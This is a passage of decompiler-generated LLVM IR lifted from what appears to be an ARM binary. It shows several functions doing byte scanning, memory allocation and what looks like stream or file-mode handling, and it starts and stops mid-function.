  %storemerge = select i1 %v2_13ce4, i32 %v1_13cec, i32 %v0_13ce0
  store i32 %storemerge, i32* @r1, align 4
  %v0_13cf4 = call i32 @function_150c0()
  store i32 %v0_13cf4, i32* %r0.global-to-local, align 4
  %v0_13cf8 = load i32, i32* @r4, align 4
  %v2_13cf8 = add i32 %v0_13cf8, %v0_13cf4
  store i32 %v2_13cf8, i32* @r4, align 4
  br label %dec_label_pc_13d38

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13cd4
  %v0_13d00 = load i32, i32* @r4, align 4
  store i32 %v0_13d00, i32* @r0, align 4
  %v0_13d04 = load i32, i32* @r7, align 4
  %v1_13d04 = inttoptr i32 %v0_13d04 to i8*
  %v2_13d04 = load i8, i8* %v1_13d04, align 1
  %v3_13d04 = zext i8 %v2_13d04 to i32
  %v5_13d08 = call i32 @function_151a0(i32 %v0_13d00, i32 %v3_13d04, i32 %v1_13ad0, i32 %v1_13adc)
  store i32 %v5_13d08, i32* %r0.global-to-local, align 4
  store i32 %v1_13acc, i32* %r2.global-to-local, align 4
  store i1 %v2_13c80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13d08, i32* @r4, align 4
  br i1 %v2_13c80, label %dec_label_pc_13d38, label %dec_label_pc_13d24

dec_label_pc_13d20:                               ; preds = %dec_label_pc_13d24
  %v1_13d20 = add i32 %v0_13d38.pre, -1
  store i32 %v1_13d20, i32* @r4, align 4
  br label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %dec_label_pc_13d00, %dec_label_pc_13d20
  %v0_13d24 = phi i32 [ %v1_13d20, %dec_label_pc_13d20 ], [ %v5_13d08, %dec_label_pc_13d00 ]
  %v1_13d24 = add i32 %v0_13d24, -1
  %v2_13d24 = inttoptr i32 %v1_13d24 to i8*
  %v3_13d24 = load i8, i8* %v2_13d24, align 1
  %v4_13d24 = zext i8 %v3_13d24 to i32
  %v0_13d28 = load i32, i32* @sl, align 4
  store i32 %v0_13d28, i32* @r0, align 4
  %v2_13d2c = call i32 @function_1528c(i32 %v0_13d28, i32 %v4_13d24)
  store i32 %v2_13d2c, i32* %r0.global-to-local, align 4
  %v2_13d30 = icmp eq i32 %v2_13d2c, 0
  store i1 %v2_13d30, i1* %cpsr_z.global-to-local, align 1
  %v0_13d38.pre = load i32, i32* @r4, align 4
  br i1 %v2_13d30, label %dec_label_pc_13d38, label %dec_label_pc_13d20

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13d24, %dec_label_pc_13d00, %dec_label_pc_13ce0
  %v3_13d44 = phi i32 [ %v5_13d08, %dec_label_pc_13d00 ], [ %v2_13cf8, %dec_label_pc_13ce0 ], [ %v0_13d38.pre, %dec_label_pc_13d24 ]
  %v1_13d38 = inttoptr i32 %v3_13d44 to i8*
  %v2_13d38 = load i8, i8* %v1_13d38, align 1
  %v3_13d38 = zext i8 %v2_13d38 to i32
  store i32 %v3_13d38, i32* %r2.global-to-local, align 4
  %v0_13d3c = load i32, i32* @r7, align 4
  %v1_13d3c = inttoptr i32 %v0_13d3c to i8*
  %v2_13d3c = load i8, i8* %v1_13d3c, align 1
  %v3_13d3c = zext i8 %v2_13d3c to i32
  store i32 %v3_13d3c, i32* %r3.global-to-local, align 4
  %v9_13d40 = icmp eq i8 %v2_13d3c, %v2_13d38
  store i1 %v9_13d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13d40, label %bb71, label %dec_label_pc_13d4c

bb71:                                             ; preds = %dec_label_pc_13d38
  %v1_13d44 = load i32, i32* @fp, align 4
  %v2_13d44 = trunc i32 %v1_13d44 to i8
  store i8 %v2_13d44, i8* %v1_13d38, align 1
  %v0_13d48.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13d48.pr, label %bb73, label %.dec_label_pc_13d4c_crit_edge

.dec_label_pc_13d4c_crit_edge:                    ; preds = %bb71
  %v0_13d4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d4c

dec_label_pc_13d4c:                               ; preds = %.dec_label_pc_13d4c_crit_edge, %dec_label_pc_13d38
  %v0_13d4c = phi i32 [ %v0_13d4c.pre, %.dec_label_pc_13d4c_crit_edge ], [ %v3_13d38, %dec_label_pc_13d38 ]
  %v2_13d4c = icmp eq i32 %v0_13d4c, 0
  store i1 %v2_13d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d4c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13d4c
  %v1_13d50 = load i32, i32* @fp, align 4
  %v2_13d50 = trunc i32 %v1_13d50 to i8
  %v3_13d50 = load i32, i32* @r4, align 4
  %v4_13d50 = inttoptr i32 %v3_13d50 to i8*
  store i8 %v2_13d50, i8* %v4_13d50, align 1
  %v5_13d50 = load i32, i32* @r4, align 4
  %v6_13d50 = add i32 %v5_13d50, 1
  store i32 %v6_13d50, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_13d4c, %bb72
  %v2_13d54 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_13d54, i32* %r3.global-to-local, align 4
  %v2_13d58 = icmp eq i32 %v2_13d54, 0
  store i1 %v2_13d58, i1* %cpsr_z.global-to-local, align 1
  %v0_13d74.pre = load i32, i32* @r4, align 4
  br i1 %v2_13d58, label %dec_label_pc_13d70, label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %bb73
  store i32 %v0_13d74.pre, i32* @r0, align 4
  %v0_13d64 = load i32, i32* @sl, align 4
  %v2_13d68 = inttoptr i32 %v0_13d74.pre to i8*
  %v3_13d68 = call i32 @function_15104(i8* %v2_13d68, i32 %v0_13d64)
  store i32 %v3_13d68, i32* %r0.global-to-local, align 4
  %v0_13d6c = load i32, i32* @r4, align 4
  %v2_13d6c = add i32 %v0_13d6c, %v3_13d68
  store i32 %v2_13d6c, i32* @r4, align 4
  br label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %bb73, %dec_label_pc_13d60
  %v0_13d74 = phi i32 [ %v2_13d6c, %dec_label_pc_13d60 ], [ %v0_13d74.pre, %bb73 ]
  %v0_13d70 = load i32, i32* @r6, align 4
  %v1_13d70 = add i32 %v0_13d70, 1
  store i32 %v1_13d70, i32* @r6, align 4
  %v1_13d74 = inttoptr i32 %v0_13d74 to i8*
  %v2_13d74 = load i8, i8* %v1_13d74, align 1
  %v3_13d74 = zext i8 %v2_13d74 to i32
  store i32 %v3_13d74, i32* %r2.global-to-local, align 4
  %v2_13d78 = icmp eq i8 %v2_13d74, 0
  store i1 %v2_13d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d78, label %dec_label_pc_13d90, label %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge

dec_label_pc_13d70.dec_label_pc_13d80_crit_edge:  ; preds = %dec_label_pc_13d70
  %v0_13d80.pre = load i32, i32* @r7, align 4
  %v1_13d80 = inttoptr i32 %v0_13d80.pre to i8*
  %v2_13d80 = load i8, i8* %v1_13d80, align 1
  %v3_13d80 = zext i8 %v2_13d80 to i32
  store i32 %v3_13d80, i32* %r3.global-to-local, align 4
  %v9_13d84 = icmp eq i8 %v2_13d80, %v2_13d74
  store i1 %v9_13d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13d84, label %dec_label_pc_13d90, label %bb74

bb74:                                             ; preds = %dec_label_pc_13d80.preheader, %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge
  %v2_13ccc88 = phi i32 [ %v1_13d70, %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge ], [ %v1_13cb0, %dec_label_pc_13d80.preheader ]
  %v0_13ccc87 = phi i32 [ %v0_13d74, %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge ], [ %v0_13d7413, %dec_label_pc_13d80.preheader ]
  %v2_13d88 = load i32, i32* @sb, align 4
  %v3_13d88 = sub i32 %v2_13ccc88, %v2_13d88
  %v5_13d88 = xor i32 %v2_13d88, %v2_13ccc88
  %v6_13d88 = xor i32 %v3_13d88, %v2_13ccc88
  %v7_13d88 = and i32 %v6_13d88, %v5_13d88
  %v8_13d88 = icmp slt i32 %v7_13d88, 0
  %v9_13d88 = icmp slt i32 %v3_13d88, 0
  %v10_13d88 = icmp eq i32 %v2_13ccc88, %v2_13d88
  store i1 %v10_13d88, i1* %cpsr_z.global-to-local, align 1
  %v2_13d8c = xor i1 %v9_13d88, %v8_13d88
  br i1 %v2_13d8c, label %dec_label_pc_13cbc, label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d80.preheader, %bb74, %dec_label_pc_13d70, %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge, %dec_label_pc_13d74.preheader
  %v0_13d94 = phi i32 [ %v1_13cb0, %dec_label_pc_13d74.preheader ], [ %v1_13cb0, %dec_label_pc_13d80.preheader ], [ %v2_13ccc88, %bb74 ], [ %v1_13d70, %dec_label_pc_13d70 ], [ %v1_13d70, %dec_label_pc_13d70.dec_label_pc_13d80_crit_edge ]
  store i32 %v3_13ab4, i32* %r2.global-to-local, align 4
  %v9_13d94 = icmp eq i32 %v0_13d94, %v3_13ab4
  store i1 %v9_13d94, i1* %cpsr_z.global-to-local, align 1
  %v6_13d98 = icmp slt i32 %v0_13d94, %v3_13ab4
  br i1 %v6_13d98, label %dec_label_pc_13d9c, label %dec_label_pc_13da8

dec_label_pc_13d9c:                               ; preds = %dec_label_pc_13d90
  %v0_13d9c = load i32, i32* @r8, align 4
  %v1_13d9c = and i32 %v0_13d9c, 1048576
  %v2_13d9c = icmp eq i32 %v1_13d9c, 0
  store i1 %v2_13d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d9c, label %dec_label_pc_13af4.backedge, label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13d9c, %dec_label_pc_13c5c, %.thread, %dec_label_pc_13a90
  br label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13d90, %dec_label_pc_13b78, %dec_label_pc_13da4
  %v0_13da8 = phi i32 [ %v0_13b88, %dec_label_pc_13b78 ], [ 0, %dec_label_pc_13da4 ], [ %v0_13d94, %dec_label_pc_13d90 ]
  store i32 %v0_13da8, i32* %r0.global-to-local, align 4
  store i32 %v3_13a90, i32* @r4, align 4
  store i32 %v6_13a90, i32* @r5, align 4
  store i32 %v9_13a90, i32* @r6, align 4
  store i32 %v12_13a90, i32* @r7, align 4
  store i32 %v15_13a90, i32* @r8, align 4
  store i32 %v18_13a90, i32* @sb, align 4
  store i32 %v21_13a90, i32* @sl, align 4
  store i32 %v24_13a90, i32* @fp, align 4
  ret i32 %v0_13da8

; uselistorder directives
  uselistorder i32 %v0_13da8, { 1, 0 }
  uselistorder i32 %v0_13d94, { 0, 2, 1 }
  uselistorder i32 %v3_13d88, { 1, 0 }
  uselistorder i32 %v2_13d88, { 1, 0, 2 }
  uselistorder i32 %v2_13ccc88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_13d84, { 1, 0 }
  uselistorder i32 %v0_13d74.pre, { 0, 2, 1 }
  uselistorder i32 %v5_13d08, { 1, 0, 2, 3 }
  uselistorder i1 %v9_13d8486, { 1, 0 }
  uselistorder i1 %v9_13cac, { 1, 0 }
  uselistorder i32 %v3_13c84, { 0, 2, 1, 3 }
  uselistorder i1 %v7_13c5c, { 1, 0 }
  uselistorder i1 %v8_13c54, { 1, 0 }
  uselistorder i32 %v3_13c24, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_13c14, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_13bfc, { 1, 0, 2 }
  uselistorder i32 %v1_13bec, { 1, 0, 2 }
  uselistorder i32 %v0_13bd8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13bd0, { 1, 0 }
  uselistorder i32 %v1_13bbc, { 1, 0 }
  uselistorder i32 %v1_13bb8, { 1, 0 }
  uselistorder i32 %v1_13b78, { 2, 0, 1 }
  uselistorder i32 %v0_13b60, { 1, 0 }
  uselistorder i32 %v1_13b50, { 0, 2, 1 }
  uselistorder i1 %v2_13c80, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13adc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_13ad0, { 2, 1, 0 }
  uselistorder i32 %v3_13ab8, { 1, 0 }
  uselistorder i32 %v3_13ab4, { 2, 1, 0 }
  uselistorder i32 %v1_13aac, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 33, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 92, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @function_15040, { 1, 0 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 12, 13, 14, 35, 0, 36, 37, 15, 16, 78, 79, 80, 81, 82, 83, 89, 90, 91, 1, 92, 93, 94, 95, 96, 97, 99, 2, 98, 101, 100, 102, 103, 104, 105, 17, 18, 19, 20, 21, 22, 23, 24, 33, 25, 26, 27, 28, 29, 30, 31, 32, 3, 34, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 7, 68, 69, 70, 4, 71, 72, 73, 74, 5, 75, 76, 77, 84, 85, 86, 87, 88, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 158, 155, 156, 157, 159, 160, 161, 162, 163, 165, 166, 164, 6, 167, 168, 169, 170, 171 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_13da8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d90, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_13d70, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13d24, { 1, 0 }
  uselistorder label %dec_label_pc_13af4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13c9c, { 1, 0 }
  uselistorder label %dec_label_pc_13c5c, { 1, 0 }
  uselistorder label %dec_label_pc_13c50, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13c14, { 1, 0 }
  uselistorder label %dec_label_pc_13b48, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_13db8(i32* %arg1) local_unnamed_addr {
dec_label_pc_13db8:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_13dbc = icmp eq i32* %arg1, null
  br i1 %v2_13dbc, label %dec_label_pc_13de4, label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13db8
  %v2_13dc4 = load i32, i32* %arg1, align 4
  %v1_13dc8 = inttoptr i32 %v2_13dc4 to i16*
  %v2_13dc8 = call i32 @function_13e34(i16* %v1_13dc8)
  %v0_13dcc = load i32, i32* @r4, align 4
  %v1_13dcc = add i32 %v0_13dcc, 20
  %v2_13dcc = inttoptr i32 %v1_13dcc to i32*
  %v3_13dcc = load i32, i32* %v2_13dcc, align 4
  %v2_13dd0 = icmp eq i32 %v3_13dcc, 0
  br i1 %v2_13dd0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_13dc4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_13dc4, %bb
  store i32 81372, i32* @lr, align 4
  %v1_13dd8 = xor i1 %v2_13dd0, true
  call void @__pseudo_cond_branch(i1 %v1_13dd8, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v0_13ddc = load i32, i32* @r4, align 4
  store i32 %v0_13ddc, i32* @r0, align 4
  %v0_13de0 = call i32 @function_120a4()
  br label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13db8, %bb6
  %v1_13de8 = phi i32 [ 0, %dec_label_pc_13db8 ], [ %v0_13de0, %bb6 ]
  ret i32 %v1_13de8

; uselistorder directives
  uselistorder i32* null, { 0, 4, 5, 1, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 19, 3, 20, 23, 21, 22, 36, 24, 8, 25, 26, 27, 28, 29, 30, 31, 32, 33, 7, 34, 35 }
  uselistorder label %dec_label_pc_13de4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_13dec(i32 %arg1) local_unnamed_addr {
dec_label_pc_13dec:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13df8 = load i32, i32* @r4, align 4
  store i32 %v3_13df8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_16020.514 to i32), i32* @r1, align 4
  %v0_13e00 = call i32 @function_13fe8()
  store i32 %v0_13e00, i32* %r0.global-to-local, align 4
  store i32 %v0_13e00, i32* @r4, align 4
  %v2_13e04 = icmp eq i32 %v0_13e00, 0
  br i1 %v2_13e04, label %bb, label %dec_label_pc_13e10

bb:                                               ; preds = %dec_label_pc_13dec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13dec
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_13e18 = call i32 @function_11958(i32 1, i32 24)
  store i32 %v2_13e18, i32* %r0.global-to-local, align 4
  %v2_13e1c = icmp eq i32 %v2_13e18, 0
  br i1 %v2_13e1c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_13e10
  %v1_13e20 = load i32, i32* @r4, align 4
  %v3_13e20 = inttoptr i32 %v2_13e18 to i32*
  store i32 %v1_13e20, i32* %v3_13e20, align 4
  %v1_13e28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_13e10, %bb4
  %v1_13e28 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_13e10 ], [ %v1_13e28.pre, %bb4 ]
  %v2_13e24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e24, i32* @r4, align 4
  ret i32 %v1_13e28

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_11958, { 29, 27, 28, 1, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_13e34(i16* %arg1) local_unnamed_addr {
dec_label_pc_13e34:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13e34 = load i32, i32* @r4, align 4
  store i32 %v3_13e34, i32* %stack_var_-36, align 4
  %v6_13e34 = load i32, i32* @r5, align 4
  %v9_13e34 = load i32, i32* @r6, align 4
  %v12_13e34 = load i32, i32* @r7, align 4
  %v2_13e38 = add i32 %tmp, 52
  %v3_13e38 = inttoptr i32 %v2_13e38 to i32*
  %v4_13e38 = load i32, i32* %v3_13e38, align 4
  %v1_13e40 = sub i32 1, %v4_13e38
  %v2_13e40 = icmp ult i32 %v4_13e38, 2
  br i1 %v2_13e40, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_13e34
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_13e34, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_13e40, %dec_label_pc_13e34 ]
  %v0_13e48 = phi i32 [ 0, %bb ], [ %v1_13e40, %dec_label_pc_13e34 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_13e48 = icmp eq i32 %v0_13e48, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 123764, i32* @r6, align 4
  br i1 %v2_13e48, label %dec_label_pc_13e94, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %bb18
  %v4_13e74 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13e74)
  %v0_13e88 = load i32, i32* @r6, align 4
  %v2_13e88 = add i32 %v0_13e88, 16
  %v3_13e88 = inttoptr i32 %v2_13e88 to i32*
  %v4_13e88 = load i32, i32* %v3_13e88, align 4
  call void @__pseudo_branch(i32 %v4_13e88)
  %v0_13e94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13e94

dec_label_pc_13e94:                               ; preds = %bb18, %dec_label_pc_13e5c
  %v1_13e9c = phi i32 [ %tmp, %bb18 ], [ %v0_13e94.pre, %dec_label_pc_13e5c ]
  %v1_13e94 = inttoptr i32 %v1_13e9c to i16*
  %v2_13e94 = load i16, i16* %v1_13e94, align 2
  %v3_13e94 = zext i16 %v2_13e94 to i32
  %v1_13e98 = and i32 %v3_13e94, 64
  %v2_13e98 = icmp eq i32 %v1_13e98, 0
  br i1 %v2_13e98, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_13e94
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_13e94, %bb19
  %storemerge26 = phi i32 [ %v1_13e9c, %bb19 ], [ %v1_13e98, %dec_label_pc_13e94 ]
  %v1_13ea0 = xor i1 %v2_13e98, true
  call void @__pseudo_cond_branch(i1 %v1_13ea0, i32 ptrtoint (i32* @global_var_147d0.519 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_13ea8 = load i32, i32* @r5, align 4
  %v1_13ea8 = add i32 %v0_13ea8, 4
  %v2_13ea8 = inttoptr i32 %v1_13ea8 to i32*
  %v3_13ea8 = load i32, i32* %v2_13ea8, align 4
  %v1_13eac = call i32 @function_10608(i32 %v3_13ea8)
  %v0_13eb4 = load i32, i32* @r6, align 4
  %v2_13ec0 = add i32 %v0_13eb4, 108
  %v3_13ec0 = inttoptr i32 %v2_13ec0 to i32*
  %v4_13ec0 = load i32, i32* %v3_13ec0, align 4
  store i32 %v4_13ec0, i32* @r7, align 4
  %v1_13ec8 = load i32, i32* @r5, align 4
  %v2_13ec8 = add i32 %v1_13ec8, 4
  %v3_13ec8 = inttoptr i32 %v2_13ec8 to i32*
  store i32 -1, i32* %v3_13ec8, align 4
  %v0_13ed0 = load i32, i32* @r6, align 4
  %v2_13ed0 = add i32 %v0_13ed0, 72
  %v3_13ed0 = inttoptr i32 %v2_13ed0 to i32*
  %v4_13ed0 = load i32, i32* %v3_13ed0, align 4
  %v1_13ed8 = icmp slt i32 %v1_13eac, 0
  store i32 %v4_13ed0, i32* %stack_var_-80, align 4
  br i1 %v1_13ed8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_13ed0)
  %v0_13f00 = load i32, i32* @r6, align 4
  %v2_13f00 = add i32 %v0_13f00, 16
  %v3_13f00 = inttoptr i32 %v2_13f00 to i32*
  %v4_13f00 = load i32, i32* %v3_13f00, align 4
  call void @__pseudo_branch(i32 %v4_13f00)
  %v0_13f10 = load i32, i32* @r6, align 4
  %v2_13f10 = add i32 %v0_13f10, 12
  %v3_13f10 = inttoptr i32 %v2_13f10 to i32*
  %v4_13f10 = load i32, i32* %v3_13f10, align 4
  %v1_13f14 = inttoptr i32 %v4_13f10 to i32*
  %v2_13f14 = load i32, i32* %v1_13f14, align 4
  %v1_13f1c = add i32 %v2_13f14, 1
  %v2_13f20 = add i32 %v0_13f10, 24
  %v3_13f20 = inttoptr i32 %v2_13f20 to i32*
  %v4_13f20 = load i32, i32* %v3_13f20, align 4
  store i32 %v4_13f20, i32* @r4, align 4
  store i32 %v1_13f1c, i32* %v1_13f14, align 4
  call void @__pseudo_branch(i32 %v4_13f20)
  %v0_13f38 = load i32, i32* @r5, align 4
  %v1_13f38 = inttoptr i32 %v0_13f38 to i16*
  %v2_13f38 = load i16, i16* %v1_13f38, align 2
  %v1_13f3c = and i16 %v2_13f38, 24576
  %v1_13f40 = or i16 %v1_13f3c, 48
  %v0_13f44 = load i32, i32* %sb.global-to-local, align 4
  %v2_13f44 = icmp eq i32 %v0_13f44, 0
  store i16 %v1_13f40, i16* %v1_13f38, align 2
  br i1 %v2_13f44, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_13f58 = xor i1 %v2_13f44, true
  call void @__pseudo_cond_branch(i1 %v2_13f58, i32 %v4_13f20)
  %v0_13f5c = load i32, i32* @r5, align 4
  %v1_13f5c = inttoptr i32 %v0_13f5c to i16*
  %v2_13f5c = load i16, i16* %v1_13f5c, align 2
  %v1_13f60 = and i16 %v2_13f5c, 16384
  %v2_13f60 = icmp eq i16 %v1_13f60, 0
  br i1 %v2_13f60, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_13f68 = xor i1 %v2_13f60, true
  call void @__pseudo_cond_branch(i1 %v1_13f68, i32 ptrtoint (i32* @global_var_120a4.55 to i32))
  %v2_13f74 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_13f74)
  call void @__pseudo_branch(i32 %v4_13f00)
  %v0_13f94 = load i32, i32* @r6, align 4
  %v2_13f94 = add i32 %v0_13f94, 48
  %v3_13f94 = inttoptr i32 %v2_13f94 to i32*
  %v4_13f94 = load i32, i32* %v3_13f94, align 4
  %v1_13f98 = inttoptr i32 %v4_13f94 to i32*
  %v2_13f98 = load i32, i32* %v1_13f98, align 4
  %v1_13f9c = add i32 %v2_13f98, 1
  store i32 %v1_13f9c, i32* %v1_13f98, align 4
  call void @__pseudo_branch(i32 %v4_13f20)
  %v0_13fb4 = call i32 @function_14648()
  %v0_13fb8 = load i32, i32* %sl.global-to-local, align 4
  %v2_13fc0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13fc0, i32* @r4, align 4
  store i32 %v6_13e34, i32* @r5, align 4
  store i32 %v9_13e34, i32* @r6, align 4
  store i32 %v12_13e34, i32* @r7, align 4
  ret i32 %v0_13fb8

; uselistorder directives
  uselistorder i1 %v2_13f60, { 1, 0 }
  uselistorder i32 %v4_13f20, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13e38, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_10608, { 27, 26, 19, 25, 24, 23, 22, 21, 20, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_13e94, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_13fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13fcc:
  %v0_13fcc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13fcc, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_13fcc
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13fcc, %bb
  %v10_13fe4 = phi i32 [ %arg1, %dec_label_pc_13fcc ], [ 0, %bb ]
  ret i32 %v10_13fe4

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_13fe8() local_unnamed_addr {
dec_label_pc_13fe8:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_13ff8 = call i32 @function_14008()
  ret i32 %v0_13ff8
}

define i32 @function_14008() local_unnamed_addr {
dec_label_pc_14008:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14008 = load i32, i32* @r4, align 4
  store i32 %v3_14008, i32* %stack_var_-36, align 4
  %v6_14008 = load i32, i32* @r5, align 4
  %v9_14008 = load i32, i32* @r6, align 4
  %v18_14008 = load i32, i32* @sb, align 4
  %v24_14008 = load i32, i32* @fp, align 4
  %v0_1400c = load i32, i32* @r1, align 4
  %v1_1400c = inttoptr i32 %v0_1400c to i8*
  %v2_1400c = load i8, i8* %v1_1400c, align 1
  %v3_1400c = zext i8 %v2_1400c to i32
  store i32 %v3_1400c, i32* @ip, align 4
  %v7_14014 = icmp eq i8 %v2_1400c, 114
  store i32 123764, i32* @fp, align 4
